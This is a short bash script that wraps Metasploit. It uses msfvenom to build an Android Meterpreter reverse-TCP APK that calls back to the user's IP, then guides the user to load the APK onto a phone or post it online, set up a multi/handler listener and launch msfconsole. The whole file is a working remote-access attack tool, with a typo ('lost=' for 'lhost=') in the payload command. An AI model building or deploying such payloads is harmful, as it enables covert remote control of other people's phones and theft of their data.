#!/bin/bash

lhost=$(hostname -I | awk '{print $1}')
    echo "Your IP address is :" $lhost
    echo "Which port do you want to use ?"
    read lport
    echo "What name do you want to give to the .apk file ? (don't put .apk)"
    read extension
    echo "Creating .apk file..."
    sudo msfvenom -p android/meterpreter/reverse_tcp lost=$lhost lport=$lport R > ~/$extension.apk
    echo ""
    echo "The apk is in your home directory, to access this folder, type this command :"
    tput setaf 2
    echo "cd ~"
    tput setaf 7
    echo "Once it's done, I advise you to take the .apk file with an USB key or by FTP/SFTP, so you can put it on an Android Phone, or put it on the Internet to  make it downloadable,
but, the .apk file is very detectable, so don't forget to install it on the phone by yourself."
    echo ""
    echo "Once you've finished and launched the .apk on the Android Phone, use those commands on metasploit :"
    echo ""
    tput setaf 2
    echo "use exploit/multi/handler"
    echo ""
    echo "set payload android/meterpreter/reverse_tcp"
    echo ""
    tput setaf 7
    echo "One that's done, you have to type by yourself the lhost and lport, with the port and ip address that you wrote on the .exe file (port : $lport, ip : $lhost)"
    echo ""
    echo "Use this commands :"
    echo ""
    tput setaf 2
    echo "set lhost $lhost"
    echo ""
    echo "set lport $lport"
    echo ""
    tput setaf 7
    echo "Once all of this is done, you just have to lauch the exploit by typing run or exploit and that's it, to see all commands, type help"
    echo ""
    echo "Launching Metasploit-Framework, please wait..."
    echo ""
    sudo service postgresql start
    sudo msfconsole -q
